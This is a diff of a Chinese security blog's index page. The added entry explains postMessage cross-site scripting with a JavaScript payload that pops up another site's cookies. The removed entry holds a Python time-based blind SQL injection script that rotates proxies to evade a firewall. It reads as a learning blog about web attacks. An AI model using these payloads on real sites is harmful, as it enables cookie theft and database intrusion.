@@ -117,6 +117,88 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/01/07/n0js-case-postMessage-xss.html" >n0js case3</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-01-07  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<ul>
+<li><a target="_blank" rel="noopener" href="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002">https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002</a></li>
+<li><a target="_blank" rel="noopener" href="http://server.n0tr00t.com/n0js/case3.php">http://server.n0tr00t.com/n0js/case3.php</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html</a></li>
+</ul>
+<p>在不同网页之间使用postMessage交流信息的时候，存在xss的情况，上面第二个链接是问题，第一个和第三个是对应的解决方法，最后的payload就是如下：</p>
+<p>简单来说，如果A存在xss，B使用postMessage接收来自A的信息，那么在A站可以加载B的iframe，弹出B的cookie。所以这种情况下，A，B都是存在Xss漏洞的。</p>
+<pre class="line-numbers language-none"><code class="language-none">var t &#x3D; document.createElement(&quot;iframe&quot;);
+t.setAttribute(&quot;src&quot;,&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;static&#x2F;test&#x2F;helloevent.html&quot;);
+&#x2F;&#x2F;t.setAttribute(&quot;onload&quot;,&quot;frames[0].postMessage(&#39;&lt;input onfocus&#x3D;alert(document.cookie) autofocus&gt;&#39;,&#39;*&#39;)&quot;);
+document.body.appendChild(t);
+
+function a()&#123;
+var b &#x3D; document.createElement(&quot;button&quot;);
+b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;&#39;,&#39;*&#39;)&quot;);
+&#x2F;&#x2F;b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;this is onerror img src&#39;,&#39;*&#39;)&quot;);
+document.body.appendChild(b);
+b.click();
+&#125;
+&#x2F;&#x2F;setTimeout(&quot;a()&quot;,3000);
+window.onload &#x3D; a();
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2017/01/07/n0js-case-postMessage-xss.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<ul>
+<li><a target="_blank" rel="noopener" href="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002">https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002</a></li>
+<li><a target="_blank" rel="noopener" href="http://server.n0tr00t.com/n0js/case3.php">http://server.n0tr00t.com/n0js/case3.php</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html</a></li>
+</ul>
+<p>在不同网页之间使用postMessage交流信息的时候，存在xss的情况，上面第二个链接是问题，第一个和第三个是对应的解决方法，最后的payload就是如下：</p>
+<p>简单来说，如果A存在xss，B使用postMessage接收来自A的信息，那么在A站可以加载B的iframe，弹出B的cookie。所以这种情况下，A，B都是存在Xss漏洞的。</p>
+<pre class="line-numbers language-none"><code class="language-none">var t &#x3D; document.createElement(&quot;iframe&quot;);
+t.setAttribute(&quot;src&quot;,&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;static&#x2F;test&#x2F;helloevent.html&quot;);
+&#x2F;&#x2F;t.setAttribute(&quot;onload&quot;,&quot;frames[0].postMessage(&#39;&lt;input onfocus&#x3D;alert(document.cookie) autofocus&gt;&#39;,&#39;*&#39;)&quot;);
+document.body.appendChild(t);
+
+function a()&#123;
+var b &#x3D; document.createElement(&quot;button&quot;);
+b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;&#39;,&#39;*&#39;)&quot;);
+&#x2F;&#x2F;b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;this is onerror img src&#39;,&#39;*&#39;)&quot;);
+document.body.appendChild(b);
+b.click();
+&#125;
+&#x2F;&#x2F;setTimeout(&quot;a()&quot;,3000);
+window.onload &#x3D; a();
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2017/01/07/n0js-case-postMessage-xss.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/01/05/SQL隐形转换绕过waf.html" >SQL隐形弱类型转换绕过</a>
 		</h3>
 		</div>
@@ -549,140 +631,6 @@ zip b.zip shell.php
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/11/08/sql-proxy.html" >Sql代理注入</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-11-08  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment"># coding: utf-8</span>
-
-<span class="token keyword">import</span> requests
-<span class="token keyword">import</span> time
-
-target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
-headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
-	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
-	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
-	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
-<span class="token punctuation">&#125;</span>
-
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
-	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
-	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>
-
-	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
-			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
-			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
-			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-			<span class="token keyword">try</span><span class="token punctuation">:</span>
-				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
-				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
-					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
-			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
-				<span class="token keyword">pass</span>
-
-	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
-		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
-		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-		<span class="token keyword">try</span><span class="token punctuation">:</span>
-			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
-			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
-				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
-				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
-				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
-				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
-				<span class="token keyword">break</span>
-		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
-			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p>
-<p>实测还没测出来，感觉有点悬。</p>
-
-	
-
-	</div>
-  <a type="button" href="/2016/11/08/sql-proxy.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment"># coding: utf-8</span>
-
-<span class="token keyword">import</span> requests
-<span class="token keyword">import</span> time
-
-target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
-headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
-	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
-	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
-	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
-<span class="token punctuation">&#125;</span>
-
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
-	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
-	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>
-
-	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
-			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
-			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
-			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-			<span class="token keyword">try</span><span class="token punctuation">:</span>
-				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
-				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
-					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
-			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
-				<span class="token keyword">pass</span>
-
-	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
-		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
-		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-		<span class="token keyword">try</span><span class="token punctuation">:</span>
-			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
-			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
-				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
-				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
-				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
-				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
-				<span class="token keyword">break</span>
-		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
-			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p>
-<p>实测还没测出来，感觉有点悬。</p>
-
-	
-	</div>
-  <a type="button" href="/2016/11/08/sql-proxy.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -734,7 +682,7 @@ headers <span class="token operator">=</span> <span class="token punctuation">&#
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>6</span></a></li>
+			<li><a href="/categories/Java/">Java<span>7</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
@@ -761,6 +709,10 @@ headers <span class="token operator">=</span> <span class="token punctuation">&#
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
+      </li>
+    
+      <li>
         <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
       </li>
     
@@ -774,10 +726,6 @@ headers <span class="token operator">=</span> <span class="token punctuation">&#
     
       <li>
         <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
       </li>
     
   </ul>
